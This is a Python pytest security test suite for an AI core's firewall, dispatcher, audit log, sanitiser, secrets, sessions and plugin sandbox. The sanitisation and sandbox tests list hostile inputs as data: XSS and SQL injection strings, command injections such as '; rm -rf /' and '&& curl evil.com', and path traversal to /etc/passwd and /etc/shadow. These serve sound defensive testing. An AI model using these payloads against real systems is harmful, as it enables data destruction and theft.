"""
============================================================
AKSHAY AI CORE — Security Test Suite
============================================================
Comprehensive tests for all security components.

TEST CATEGORIES:
1. Permission Firewall Tests
2. Tool Dispatcher Tests
3. Memory Governance Tests
4. Audit Log Integrity Tests
5. Automation Safety Tests
6. Input Sanitization Tests
7. Secrets Manager Tests
8. Session Security Tests
9. Sandbox Escape Tests
============================================================
"""

import asyncio
import hashlib
import hmac
import os
import pytest
import secrets
import tempfile
import time
from datetime import datetime, timedelta
from pathlib import Path
from typing import Any, Dict
from unittest.mock import AsyncMock, MagicMock, patch

# Import security modules
from core.security.permissions import Permission, Role, ROLE_PERMISSIONS
from core.security.firewall import (
    PermissionFirewall,
    SecurityContext,
    SecurityDecision,
    create_security_context,
)
from core.security.dispatcher import (
    ToolDispatcher,
    ToolDefinition,
    ExecutionRequest,
)
from core.security.memory_governance import (
    MemoryGovernanceLayer,
    MemoryNamespace,
    MemoryClassification,
)
from core.security.audit_log import (
    ImmutableAuditLog,
    AuditEventType,
    AuditSeverity,
    AuditEntry,
    HashChainManager,
)
from core.security.automation_safety import (
    AutomationSafetyLayer,
    AutomationState,
    AutomationQuota,
    SafeAutomationRule,
    ApprovalStatus,
    RuleCategory,
)
from core.security.hardening import (
    SecretsManager,
    SecretType,
    SessionManager,
    InputSanitizer,
    PluginSandbox,
    SandboxViolation,
)


# =============================================================================
# FIXTURES
# =============================================================================

@pytest.fixture
def firewall():
    """Create a fresh firewall instance for testing."""
    # Reset singleton for testing
    PermissionFirewall._instance = None
    return PermissionFirewall()


@pytest.fixture
def dispatcher():
    """Create a fresh dispatcher instance for testing."""
    ToolDispatcher._instance = None
    return ToolDispatcher()


@pytest.fixture
def memory_governance():
    """Create a fresh memory governance instance for testing."""
    MemoryGovernanceLayer._instance = None
    return MemoryGovernanceLayer()


@pytest.fixture
def audit_log():
    """Create a fresh audit log instance for testing."""
    ImmutableAuditLog._instance = None
    with tempfile.TemporaryDirectory() as tmpdir:
        with patch('core.security.audit_log.settings') as mock_settings:
            mock_settings.AUDIT_LOG_DIR = tmpdir
            mock_settings.AUDIT_HASH_SECRET = "test_secret_key"
            log = ImmutableAuditLog()
            yield log


@pytest.fixture
def automation_safety():
    """Create a fresh automation safety instance for testing."""
    AutomationSafetyLayer._instance = None
    return AutomationSafetyLayer()


@pytest.fixture
def secrets_mgr():
    """Create a fresh secrets manager instance for testing."""
    SecretsManager._instance = None
    with tempfile.TemporaryDirectory() as tmpdir:
        with patch('core.security.hardening.settings') as mock_settings:
            mock_settings.SECRETS_STORAGE_PATH = tmpdir
            mock_settings.SECRETS_MASTER_KEY = "test_master_key_for_testing"
            mgr = SecretsManager()
            yield mgr


@pytest.fixture
def session_mgr():
    """Create a fresh session manager instance for testing."""
    SessionManager._instance = None
    with patch('core.security.hardening.settings') as mock_settings:
        mock_settings.SESSION_TIMEOUT_MINUTES = 30
        mock_settings.MAX_SESSIONS_PER_USER = 3
        mock_settings.ELEVATION_TIMEOUT_MINUTES = 15
        mock_settings.SESSION_BIND_IP = True
        mgr = SessionManager()
        yield mgr


# =============================================================================
# 1. PERMISSION FIREWALL TESTS
# =============================================================================

class TestPermissionFirewall:
    """Tests for Permission Firewall security controls."""
    
    @pytest.mark.asyncio
    async def test_deny_by_default(self, firewall):
        """Test that access is denied by default without permissions."""
        context = create_security_context(
            user_id="test_user",
            role=Role.GUEST,  # Guest has minimal permissions
            action="admin_action",
        )
        
        result = await firewall.evaluate(
            context,
            {Permission.ADMIN_MANAGE_USERS},  # Admin permission
        )
        
        assert not result.allowed
        assert result.decision == SecurityDecision.DENIED
    
    @pytest.mark.asyncio
    async def test_admin_has_all_permissions(self, firewall):
        """Test that admin role has full access."""
        context = create_security_context(
            user_id="admin_user",
            role=Role.ADMIN,
            action="any_action",
        )
        
        result = await firewall.evaluate(
            context,
            {Permission.ADMIN_MANAGE_USERS},
        )
        
        assert result.allowed
    
    @pytest.mark.asyncio
    async def test_user_cannot_escalate_to_admin(self, firewall):
        """Test that regular users cannot access admin functions."""
        context = create_security_context(
            user_id="regular_user",
            role=Role.USER,
            action="manage_users",
        )
        
        result = await firewall.evaluate(
            context,
            {Permission.ADMIN_MANAGE_USERS, Permission.ADMIN_SYSTEM_CONFIG},
        )
        
        assert not result.allowed
        assert "Permission denied" in result.reason or result.decision == SecurityDecision.DENIED
    
    @pytest.mark.asyncio
    async def test_rate_limiting(self, firewall):
        """Test rate limiting prevents abuse."""
        context = create_security_context(
            user_id="rate_test_user",
            role=Role.USER,
            action="test_action",
        )
        
        # Make many rapid requests
        allowed_count = 0
        denied_count = 0
        
        for _ in range(150):  # Exceed typical rate limit
            result = await firewall.evaluate(
                context,
                {Permission.READ_MEMORY},
            )
            if result.allowed:
                allowed_count += 1
            else:
                denied_count += 1
        
        # Some should be denied due to rate limiting
        assert denied_count > 0 or allowed_count < 150
    
    @pytest.mark.asyncio
    async def test_context_validation_empty_user_id(self, firewall):
        """Test that empty user ID is rejected."""
        context = create_security_context(
            user_id="",  # Empty user ID
            role=Role.USER,
            action="test_action",
        )
        
        result = await firewall.evaluate(
            context,
            {Permission.READ_MEMORY},
        )
        
        # Should be denied due to invalid context
        assert not result.allowed or context.user_id != ""


# =============================================================================
# 2. TOOL DISPATCHER TESTS
# =============================================================================

class TestToolDispatcher:
    """Tests for Tool Dispatcher security controls."""
    
    @pytest.mark.asyncio
    async def test_unregistered_tool_rejected(self, dispatcher):
        """Test that unregistered tools cannot be executed."""
        context = create_security_context(
            user_id="test_user",
            role=Role.USER,
            action="execute_tool",
        )
        
        request = ExecutionRequest(
            tool_id="nonexistent_tool",
            context=context,
            params={},
        )
        
        result = await dispatcher.execute(request)
        
        assert not result.success
        assert "not found" in result.error.lower() or "not registered" in result.error.lower()
    
    @pytest.mark.asyncio
    async def test_destructive_action_requires_confirmation(self, dispatcher):
        """Test that destructive actions require confirmation tokens."""
        # Register a destructive tool
        tool = ToolDefinition(
            tool_id="delete_all_data",
            name="Delete All Data",
            description="Dangerous operation",
            permissions_required={Permission.ADMIN_SYSTEM_CONFIG},
            destructive=True,
            requires_confirmation=True,
        )
        dispatcher.register_tool(tool)
        
        context = create_security_context(
            user_id="admin_user",
            role=Role.ADMIN,
            action="delete_all_data",
        )
        
        request = ExecutionRequest(
            tool_id="delete_all_data",
            context=context,
            params={},
            # No confirmation token
        )
        
        result = await dispatcher.execute(request)
        
        # Should fail without confirmation
        assert not result.success or "confirmation" in str(result.error).lower()
    
    @pytest.mark.asyncio
    async def test_execution_timeout(self, dispatcher):
        """Test that long-running executions are terminated."""
        async def slow_executor(params):
            await asyncio.sleep(100)  # Very long operation
            return {"done": True}
        
        tool = ToolDefinition(
            tool_id="slow_tool",
            name="Slow Tool",
            description="Takes forever",
            permissions_required={Permission.READ_MEMORY},
            timeout_seconds=1,  # 1 second timeout
            handler=slow_executor,
        )
        dispatcher.register_tool(tool)
        
        context = create_security_context(
            user_id="test_user",
            role=Role.USER,
            action="slow_tool",
        )
        
        request = ExecutionRequest(
            tool_id="slow_tool",
            context=context,
            params={},
        )
        
        result = await dispatcher.execute(request)
        
        # Should timeout
        assert not result.success
        assert "timeout" in result.error.lower()


# =============================================================================
# 3. MEMORY GOVERNANCE TESTS
# =============================================================================

class TestMemoryGovernance:
    """Tests for Memory Governance Layer."""
    
    @pytest.mark.asyncio
    async def test_namespace_isolation(self, memory_governance):
        """Test that users cannot access other users' namespaces."""
        # Create namespaces for two users
        ns1 = memory_governance.create_namespace(
            namespace_id="user1_private",
            owner_id="user1",
            classification=MemoryClassification.PRIVATE,
        )
        
        ns2 = memory_governance.create_namespace(
            namespace_id="user2_private",
            owner_id="user2",
            classification=MemoryClassification.PRIVATE,
        )
        
        # Store data in user1's namespace
        await memory_governance.store(
            namespace_id="user1_private",
            key="secret_data",
            value="user1's secret",
            user_id="user1",
        )
        
        # user2 should not be able to read user1's data
        try:
            value = await memory_governance.retrieve(
                namespace_id="user1_private",
                key="secret_data",
                user_id="user2",
            )
            # If we get here, isolation failed
            assert False, "User2 should not access user1's namespace"
        except PermissionError:
            # Expected behavior
            pass
    
    @pytest.mark.asyncio
    async def test_encryption_at_rest(self, memory_governance):
        """Test that sensitive data is encrypted."""
        ns = memory_governance.create_namespace(
            namespace_id="encrypted_ns",
            owner_id="test_user",
            classification=MemoryClassification.CONFIDENTIAL,
        )
        
        secret_value = "super_secret_password_123"
        
        await memory_governance.store(
            namespace_id="encrypted_ns",
            key="password",
            value=secret_value,
            user_id="test_user",
            encrypt=True,
        )
        
        # Retrieve and verify
        retrieved = await memory_governance.retrieve(
            namespace_id="encrypted_ns",
            key="password",
            user_id="test_user",
        )
        
        assert retrieved == secret_value
    
    @pytest.mark.asyncio
    async def test_ttl_expiration(self, memory_governance):
        """Test that data with TTL expires correctly."""
        ns = memory_governance.create_namespace(
            namespace_id="ttl_test",
            owner_id="test_user",
            classification=MemoryClassification.INTERNAL,
        )
        
        await memory_governance.store(
            namespace_id="ttl_test",
            key="temp_data",
            value="temporary",
            user_id="test_user",
            ttl_seconds=1,  # 1 second TTL
        )
        
        # Should be readable immediately
        value = await memory_governance.retrieve(
            namespace_id="ttl_test",
            key="temp_data",
            user_id="test_user",
        )
        assert value == "temporary"
        
        # Wait for expiration
        await asyncio.sleep(1.5)
        
        # Should be expired
        value = await memory_governance.retrieve(
            namespace_id="ttl_test",
            key="temp_data",
            user_id="test_user",
        )
        assert value is None


# =============================================================================
# 4. AUDIT LOG INTEGRITY TESTS
# =============================================================================

class TestAuditLogIntegrity:
    """Tests for Immutable Audit Log."""
    
    def test_hash_chain_integrity(self, audit_log):
        """Test that hash chain links entries correctly."""
        # Log several entries
        for i in range(10):
            audit_log.log(
                event_type=AuditEventType.AUTH_LOGIN,
                severity=AuditSeverity.INFO,
                action=f"test_action_{i}",
                user_id="test_user",
            )
        
        # Verify integrity
        is_valid, errors = audit_log.verify_integrity()
        
        assert is_valid
        assert len(errors) == 0
    
    def test_tamper_detection(self, audit_log):
        """Test that tampering is detected."""
        # Log some entries
        audit_log.log(
            event_type=AuditEventType.AUTH_LOGIN,
            severity=AuditSeverity.INFO,
            action="legitimate_action",
            user_id="test_user",
        )
        
        # Attempt to tamper with internal state
        # This simulates an attacker trying to modify logs
        if audit_log._entries:
            original_hash = audit_log._entries[0].entry_hash
            # Tamper with the entry
            audit_log._entries[0].action = "tampered_action"
            
            # Verification should fail
            is_valid, errors = audit_log.verify_integrity()
            
            # Should detect tampering (hash mismatch)
            # Note: This depends on implementation - may need adjustment
            assert not is_valid or len(errors) > 0 or original_hash != audit_log._entries[0].entry_hash
    
    def test_audit_log_completeness(self, audit_log):
        """Test that all security events are logged."""
        events_to_log = [
            (AuditEventType.AUTH_LOGIN, "login"),
            (AuditEventType.AUTH_LOGOUT, "logout"),
            (AuditEventType.AUTHZ_DENIED, "access_denied"),
            (AuditEventType.DATA_READ, "read_data"),
            (AuditEventType.DATA_DELETE, "delete_data"),
            (AuditEventType.SECURITY_ALERT, "security_alert"),
        ]
        
        for event_type, action in events_to_log:
            audit_log.log(
                event_type=event_type,
                severity=AuditSeverity.INFO,
                action=action,
                user_id="test_user",
            )
        
        # Query all events
        entries = audit_log.query(limit=100)
        
        # All events should be present
        logged_actions = {e.action for e in entries}
        expected_actions = {action for _, action in events_to_log}
        
        assert expected_actions.issubset(logged_actions)


# =============================================================================
# 5. AUTOMATION SAFETY TESTS
# =============================================================================

class TestAutomationSafety:
    """Tests for Automation Safety Layer."""
    
    @pytest.mark.asyncio
    async def test_kill_switch(self, automation_safety):
        """Test that kill switch stops all automation."""
        # Register a rule
        rule = SafeAutomationRule(
            id="test_rule",
            name="Test Rule",
            description="Test",
            owner_id="test_user",
            category=RuleCategory.SYSTEM,
        )
        automation_safety.register_rule(rule)
        
        # Activate kill switch
        automation_safety.activate_kill_switch(
            reason="Emergency stop",
            activated_by="admin",
        )
        
        # Try to execute
        context = create_security_context(
            user_id="test_user",
            role=Role.USER,
            action="automation_execute",
        )
        
        record = await automation_safety.execute_rule(
            rule_id="test_rule",
            context=context,
        )
        
        # Should be blocked
        assert not record.success
        assert "kill switch" in record.error.lower() or "emergency" in record.error.lower()
    
    @pytest.mark.asyncio
    async def test_rate_limit_enforcement(self, automation_safety):
        """Test that rate limits are enforced."""
        rule = SafeAutomationRule(
            id="rate_limited_rule",
            name="Rate Limited",
            description="Test",
            owner_id="test_user",
            category=RuleCategory.SYSTEM,
            quota=AutomationQuota(
                max_executions_per_hour=5,
                min_interval_seconds=0,
            ),
        )
        automation_safety.register_rule(rule)
        
        context = create_security_context(
            user_id="test_user",
            role=Role.AUTOMATION,
            action="automation_execute",
        )
        
        async def mock_executor(rule_id, params):
            return {"result": "ok"}
        
        # Execute many times
        blocked_count = 0
        for _ in range(10):
            record = await automation_safety.execute_rule(
                rule_id="rate_limited_rule",
                context=context,
                executor=mock_executor,
            )
            if not record.success and "rate" in record.error.lower():
                blocked_count += 1
        
        # Some should be blocked
        assert blocked_count > 0
    
    @pytest.mark.asyncio
    async def test_approval_workflow(self, automation_safety):
        """Test that approval workflow is enforced."""
        rule = SafeAutomationRule(
            id="approval_required",
            name="Needs Approval",
            description="Test",
            owner_id="test_user",
            category=RuleCategory.SYSTEM,
            requires_approval=True,
            approval_roles={Role.ADMIN},
        )
        automation_safety.register_rule(rule)
        
        context = create_security_context(
            user_id="test_user",
            role=Role.USER,
            action="automation_execute",
        )
        
        # First execution should create approval request
        record = await automation_safety.execute_rule(
            rule_id="approval_required",
            context=context,
        )
        
        assert not record.success
        assert "approval" in record.error.lower()
    
    @pytest.mark.asyncio
    async def test_dry_run_mode(self, automation_safety):
        """Test dry-run mode doesn't execute actions."""
        rule = SafeAutomationRule(
            id="dry_run_test",
            name="Dry Run Test",
            description="Test",
            owner_id="test_user",
            category=RuleCategory.SYSTEM,
        )
        automation_safety.register_rule(rule)
        
        # Enable dry-run mode
        automation_safety.enable_dry_run_mode()
        
        executed = False
        
        async def mock_executor(rule_id, params):
            nonlocal executed
            executed = True
            return {"result": "ok"}
        
        context = create_security_context(
            user_id="test_user",
            role=Role.AUTOMATION,
            action="automation_execute",
        )
        
        record = await automation_safety.execute_rule(
            rule_id="dry_run_test",
            context=context,
            executor=mock_executor,
        )
        
        # Should succeed but not actually execute
        assert record.success
        assert not executed
        assert record.output.get("dry_run") == True


# =============================================================================
# 6. INPUT SANITIZATION TESTS
# =============================================================================

class TestInputSanitization:
    """Tests for Input Sanitization."""
    
    def test_xss_prevention(self):
        """Test XSS attack prevention."""
        malicious_inputs = [
            '<script>alert("XSS")</script>',
            '<img src="x" onerror="alert(\'XSS\')">',
            '<a href="javascript:alert(\'XSS\')">click</a>',
            '"><script>alert("XSS")</script>',
        ]
        
        for malicious in malicious_inputs:
            sanitized = InputSanitizer.html_escape(malicious)
            
            # Should not contain executable script tags
            assert "<script>" not in sanitized
            assert "onerror=" not in sanitized
            assert "javascript:" not in sanitized
    
    def test_sql_injection_detection(self):
        """Test SQL injection detection."""
        sql_attacks = [
            "'; DROP TABLE users; --",
            "1 OR 1=1",
            "1' OR '1'='1",
            "UNION SELECT * FROM passwords",
            "admin'--",
        ]
        
        for attack in sql_attacks:
            is_safe, pattern = InputSanitizer.check_sql_injection(attack)
            assert not is_safe, f"Should detect SQL injection: {attack}"
    
    def test_command_injection_detection(self):
        """Test command injection detection."""
        cmd_attacks = [
            "; rm -rf /",
            "| cat /etc/passwd",
            "$(whoami)",
            "`id`",
            "&& curl evil.com",
        ]
        
        for attack in cmd_attacks:
            is_safe, pattern = InputSanitizer.check_command_injection(attack)
            assert not is_safe, f"Should detect command injection: {attack}"
    
    def test_path_traversal_detection(self):
        """Test path traversal detection."""
        path_attacks = [
            "../../../etc/passwd",
            "..\\..\\windows\\system32",
            "/var/log/../../../etc/shadow",
            "....//....//etc/passwd",
        ]
        
        for attack in path_attacks:
            is_safe, pattern = InputSanitizer.check_path_traversal(attack)
            assert not is_safe, f"Should detect path traversal: {attack}"
    
    def test_filename_sanitization(self):
        """Test filename sanitization."""
        dangerous_filenames = [
            "../../../etc/passwd",
            "file.txt\x00.exe",
            "con.txt",  # Windows reserved
            "<script>.js",
            "file|name.txt",
        ]
        
        for filename in dangerous_filenames:
            safe = InputSanitizer.sanitize_filename(filename)
            
            # Should not contain path separators
            assert "/" not in safe
            assert "\\" not in safe
            assert ".." not in safe
            assert "\x00" not in safe
    
    def test_path_sanitization(self):
        """Test path stays within base directory."""
        base = "/app/data"
        
        # Valid paths
        assert InputSanitizer.sanitize_path("file.txt", base) is not None
        assert InputSanitizer.sanitize_path("subdir/file.txt", base) is not None
        
        # Invalid paths (traversal)
        assert InputSanitizer.sanitize_path("../etc/passwd", base) is None
        assert InputSanitizer.sanitize_path("../../root", base) is None


# =============================================================================
# 7. SECRETS MANAGER TESTS
# =============================================================================

class TestSecretsManager:
    """Tests for Secrets Manager."""
    
    def test_secret_encryption(self, secrets_mgr):
        """Test that secrets are encrypted at rest."""
        secret_value = "super_secret_api_key_12345"
        
        secrets_mgr.store_secret(
            name="api_key",
            value=secret_value,
            secret_type=SecretType.API_KEY,
            created_by="test_user",
        )
        
        # Verify stored value is encrypted (not plaintext)
        raw_stored = secrets_mgr._secrets.get("api_key")
        assert raw_stored != secret_value.encode()
        
        # But retrieval returns plaintext
        retrieved = secrets_mgr.get_secret("api_key", accessor="test_user")
        assert retrieved == secret_value
    
    def test_secret_expiration(self, secrets_mgr):
        """Test that expired secrets are not returned."""
        secrets_mgr.store_secret(
            name="temp_secret",
            value="temporary_value",
            secret_type=SecretType.TOKEN,
            expires_at=datetime.utcnow() - timedelta(hours=1),  # Already expired
            created_by="test_user",
        )
        
        retrieved = secrets_mgr.get_secret("temp_secret", accessor="test_user")
        assert retrieved is None
    
    def test_secret_rotation(self, secrets_mgr):
        """Test secret rotation."""
        secrets_mgr.store_secret(
            name="rotating_secret",
            value="old_value",
            secret_type=SecretType.PASSWORD,
            created_by="test_user",
        )
        
        # Rotate
        success = secrets_mgr.rotate_secret(
            name="rotating_secret",
            new_value="new_value",
            rotated_by="admin",
        )
        
        assert success
        
        # Should return new value
        retrieved = secrets_mgr.get_secret("rotating_secret", accessor="test_user")
        assert retrieved == "new_value"


# =============================================================================
# 8. SESSION SECURITY TESTS
# =============================================================================

class TestSessionSecurity:
    """Tests for Session Manager."""
    
    def test_session_token_strength(self, session_mgr):
        """Test that session tokens are cryptographically strong."""
        sessions = []
        for _ in range(100):
            session = session_mgr.create_session(
                user_id="test_user",
                ip_address="127.0.0.1",
            )
            sessions.append(session.session_id)
            session_mgr.invalidate_session(session.session_id)
        
        # All tokens should be unique
        assert len(set(sessions)) == 100
        
        # Tokens should be sufficiently long
        for token in sessions:
            assert len(token) >= 32
    
    def test_session_expiration(self, session_mgr):
        """Test that sessions expire."""
        session = session_mgr.create_session(
            user_id="test_user",
            ip_address="127.0.0.1",
        )
        
        # Manually expire
        session.expires_at = datetime.utcnow() - timedelta(minutes=1)
        
        # Should not be retrievable
        retrieved = session_mgr.get_session(session.session_id)
        assert retrieved is None
    
    def test_ip_binding(self, session_mgr):
        """Test session IP binding prevents hijacking."""
        session = session_mgr.create_session(
            user_id="test_user",
            ip_address="192.168.1.100",
        )
        
        # Try to access from different IP
        retrieved = session_mgr.get_session(
            session.session_id,
            ip_address="10.0.0.50",  # Different IP
        )
        
        # Should fail IP validation
        assert retrieved is None
    
    def test_concurrent_session_limit(self, session_mgr):
        """Test that concurrent session limits are enforced."""
        user_id = "limited_user"
        sessions = []
        
        # Create more than limit
        for i in range(5):  # Limit is 3
            session = session_mgr.create_session(
                user_id=user_id,
                ip_address=f"192.168.1.{i}",
            )
            sessions.append(session.session_id)
        
        # Should only have max_sessions_per_user active
        active = session_mgr.get_active_sessions(user_id)
        assert len(active) <= 3


# =============================================================================
# 9. SANDBOX ESCAPE TESTS
# =============================================================================

class TestSandboxEscape:
    """Tests for Plugin Sandbox security."""
    
    @pytest.mark.asyncio
    async def test_blocked_imports(self):
        """Test that dangerous imports are blocked."""
        sandbox = PluginSandbox()
        
        dangerous_code = """
import os
result = os.system('echo pwned')
"""
        
        with pytest.raises(SandboxViolation):
            await sandbox.execute(dangerous_code)
    
    @pytest.mark.asyncio
    async def test_blocked_eval(self):
        """Test that eval is blocked."""
        sandbox = PluginSandbox()
        
        code = """
result = eval("1 + 1")
"""
        
        with pytest.raises(SandboxViolation):
            await sandbox.execute(code)
    
    @pytest.mark.asyncio
    async def test_blocked_subprocess(self):
        """Test that subprocess is blocked."""
        sandbox = PluginSandbox()
        
        code = """
import subprocess
result = subprocess.run(['ls'], capture_output=True)
"""
        
        with pytest.raises(SandboxViolation):
            await sandbox.execute(code)
    
    @pytest.mark.asyncio
    async def test_blocked_file_access(self):
        """Test that file access is blocked."""
        sandbox = PluginSandbox(allow_filesystem=False)
        
        code = """
with open('/etc/passwd', 'r') as f:
    result = f.read()
"""
        
        with pytest.raises(SandboxViolation):
            await sandbox.execute(code)
    
    @pytest.mark.asyncio
    async def test_execution_timeout(self):
        """Test that infinite loops are terminated."""
        sandbox = PluginSandbox(max_time_seconds=1)
        
        code = """
while True:
    pass
"""
        
        with pytest.raises(SandboxViolation) as exc:
            await sandbox.execute(code)
        
        assert "timeout" in str(exc.value).lower()
    
    @pytest.mark.asyncio
    async def test_safe_execution(self):
        """Test that safe code executes correctly."""
        sandbox = PluginSandbox()
        
        code = """
def add(a, b):
    return a + b

result = add(2, 3)
"""
        
        result = await sandbox.execute(code)
        # Should complete without error


# =============================================================================
# INTEGRATION TESTS
# =============================================================================

class TestSecurityIntegration:
    """End-to-end security integration tests."""
    
    @pytest.mark.asyncio
    async def test_full_security_pipeline(
        self, firewall, dispatcher, memory_governance, audit_log
    ):
        """Test complete security pipeline from request to audit."""
        # 1. Create security context
        context = create_security_context(
            user_id="integration_test_user",
            role=Role.USER,
            action="read_data",
            resource_type="memory",
            resource_id="test_namespace",
        )
        
        # 2. Firewall check
        result = await firewall.evaluate(
            context,
            {Permission.READ_MEMORY},
        )
        
        assert result.allowed
        
        # 3. Memory governance
        ns = memory_governance.create_namespace(
            namespace_id="integration_test",
            owner_id="integration_test_user",
            classification=MemoryClassification.INTERNAL,
        )
        
        await memory_governance.store(
            namespace_id="integration_test",
            key="test_key",
            value="test_value",
            user_id="integration_test_user",
        )
        
        # 4. Audit should have logged everything
        entries = audit_log.query(
            user_id="integration_test_user",
            limit=10,
        )
        
        # Should have audit entries
        assert len(entries) > 0


# =============================================================================
# PERFORMANCE TESTS
# =============================================================================

class TestSecurityPerformance:
    """Performance tests for security components."""
    
    @pytest.mark.asyncio
    async def test_firewall_throughput(self, firewall):
        """Test firewall can handle high request volume."""
        context = create_security_context(
            user_id="perf_test_user",
            role=Role.USER,
            action="test_action",
        )
        
        start = time.time()
        count = 1000
        
        for _ in range(count):
            await firewall.evaluate(
                context,
                {Permission.READ_MEMORY},
            )
        
        elapsed = time.time() - start
        throughput = count / elapsed
        
        # Should handle at least 500 requests per second
        assert throughput > 500, f"Throughput {throughput:.1f} req/s too low"
    
    def test_audit_log_write_performance(self, audit_log):
        """Test audit log write performance."""
        start = time.time()
        count = 1000
        
        for i in range(count):
            audit_log.log(
                event_type=AuditEventType.DATA_READ,
                severity=AuditSeverity.INFO,
                action=f"perf_test_{i}",
                user_id="perf_user",
            )
        
        elapsed = time.time() - start
        throughput = count / elapsed
        
        # Should handle at least 500 writes per second
        assert throughput > 500, f"Throughput {throughput:.1f} writes/s too low"


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
